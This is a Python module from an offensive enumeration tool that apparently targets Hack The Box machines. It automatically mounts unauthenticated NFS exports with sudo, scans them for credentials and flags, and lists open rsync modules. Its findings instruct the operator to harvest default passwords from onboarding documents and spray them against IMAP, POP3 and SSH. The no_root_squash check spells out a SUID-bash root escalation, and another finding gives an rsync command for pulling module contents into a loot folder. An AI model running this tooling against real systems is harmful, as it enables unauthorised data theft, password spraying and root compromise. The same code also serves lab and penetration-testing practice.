"""NFS and rsync enumeration — often world-readable and full of loot."""

from __future__ import annotations

import os
import tempfile

from ...core import utils, tooling
from ...core.report import HostReport, Finding
from .. import crack


def nfs(host: HostReport, port: int = 2049) -> None:
    ip = host.resolved_ip
    utils.section(f"NFS {ip}:{port}")
    if not tooling.resolve("showmount"):
        utils.log("dim", "install nfs-common (showmount) to list exports", indent=1)
        return
    rc, out, _ = utils.run(["showmount", "-e", ip], timeout=20)
    exports = [l.strip() for l in (out or "").splitlines()[1:] if l.strip()]
    if not exports:
        utils.log("dim", "no exports listed (or access denied)", indent=1)
        return
    utils.log("hot", f"{len(exports)} NFS export(s)", indent=1)
    for e in exports:
        utils.log("good", e, indent=2)
    host.add(Finding(
        title="NFS exports available", detail="; ".join(exports),
        severity="high", category="leak", port=port, service="nfs",
        evidence="\n".join(exports)))

    # Mount every export read-only and loot it — same treatment as an open SMB
    # share. This is where the creds/flags actually live (HTB Enigma's
    # /srv/nfs/onboarding holds the onboarding docs + a default password).
    for line in exports:
        _loot_export(host, ip, line.split()[0], port)


def _loot_export(host: HostReport, ip: str, export: str, port: int) -> None:
    if not tooling.resolve("mount"):
        utils.log("dim", f"mount not available — do it manually: "
                         f"sudo mount -t nfs {ip}:{export} /mnt", indent=2)
        return
    src = f"{ip}:{export}"
    root = os.geteuid() == 0
    if not root and not utils.ensure_sudo():
        utils.log("warn", f"mount needs root and sudo is unavailable — run it "
                         f"by hand: sudo mount -t nfs {src} /mnt", indent=2)
        return
    mp = tempfile.mkdtemp(prefix="scryer_nfs_")
    base = ["mount"] if root else ["sudo", "-n", "mount"]
    mount_cmd = base + ["-t", "nfs", "-o",
                        "ro,nolock,soft,timeo=30,retry=0,nfsvers=3",
                        src, mp]
    rc, out, err = utils.run(mount_cmd, timeout=45)
    if rc != 0:
        # retry without forcing v3 (some exports are v4-only)
        rc, out, err = utils.run(
            base + ["-t", "nfs", "-o", "ro,nolock,soft,timeo=30", src, mp],
            timeout=45)
    if rc != 0:
        detail = (err or out or "").strip()[:100]
        utils.log("dim", f"could not mount {src} ({detail}) — try: sudo mount "
                         f"-t nfs {src} /mnt", indent=2)
        _rmdir(mp)
        return

    utils.log("hot", f"mounted {src} -> looting for creds/flags/configs", indent=2)
    try:
        _check_squash(host, mp, ip, export, port)
        _inventory(host, mp, src, port)
        crack.scan_dir(host, mp, port, "nfs")
    finally:
        umount = (["umount"] if os.geteuid() == 0 else ["sudo", "-n", "umount"])
        utils.run(umount + ["-f", "-l", mp], timeout=20)
        _rmdir(mp)


def _inventory(host, mp, src, port) -> None:
    """List the files on the export so a human-readable secret (a password in an
    onboarding PDF/email) is at least visible even if auto-extraction misses it."""
    files = []
    for base, _dirs, names in os.walk(mp):
        for n in names:
            rel = os.path.relpath(os.path.join(base, n), mp)
            files.append(rel)
            if len(files) >= 200:
                break
    if not files:
        return
    utils.log("good", f"{len(files)} file(s): " + ", ".join(files[:12])
              + (" …" if len(files) > 12 else ""), indent=3)
    host.add(Finding(
        title=f"NFS export contents: {src}",
        detail=", ".join(files[:60]) + (" …" if len(files) > 60 else "")
               + "  — read the onboarding/HR docs for usernames + default "
                 "passwords, then spray mail (IMAP/POP3) / SSH.",
        severity="info", category="loot", port=port, service="nfs",
        evidence="\n".join(files[:200])))


def _check_squash(host, mp, ip, export, port) -> None:
    """A no_root_squash export = write a SUID root binary as local root -> root
    on the target. Detect it by whether we can write (we don't — just flag the
    classic privesc when the mount is writable-looking)."""
    try:
        root_owned = any(
            os.stat(os.path.join(mp, f)).st_uid == 0
            for f in os.listdir(mp)[:20]) if os.listdir(mp) else False
    except OSError:
        root_owned = False
    if root_owned:
        host.add(Finding(
            title="NFS export may allow no_root_squash SUID privesc",
            detail=f"{ip}:{export} contains root-owned files. If it's "
                   "no_root_squash, as local root drop a SUID-root shell here "
                   "then run it on the target: cp /bin/bash "
                   f"/mnt/x; chmod +s /mnt/x -> /srv/.../x -p (uid=0).",
            severity="high", category="service", port=port, service="nfs",
            confidence="potential"))


def _rmdir(path: str) -> None:
    try:
        os.rmdir(path)
    except OSError:
        pass


def rsync(host: HostReport, port: int = 873) -> None:
    ip = host.resolved_ip
    utils.section(f"rsync {ip}:{port}")
    if tooling.resolve("rsync"):
        rc, out, err = utils.run(
            ["rsync", "-av", "--list-only", "--timeout=10", f"rsync://{ip}:{port}/"],
            timeout=25)
        modules = [l.split()[0] for l in (out or "").splitlines()
                   if l.strip() and not l.startswith(" ")]
        if modules:
            utils.log("hot", f"rsync modules: {', '.join(modules)}", indent=1)
            host.add(Finding(
                title="rsync modules listable (unauthenticated)",
                detail=", ".join(modules),
                severity="high", category="leak", port=port, service="rsync",
                evidence=out[:400]))
            host.add(Finding(
                title="Pull rsync module contents",
                detail=f"rsync -av rsync://{ip}:{port}/<module>/ ./loot/",
                severity="info", category="service", port=port, service="rsync",
                confidence="potential"))
        else:
            utils.log("dim", "no modules listed / auth required", indent=1)
    else:
        utils.log("dim", "rsync client not installed", indent=1)
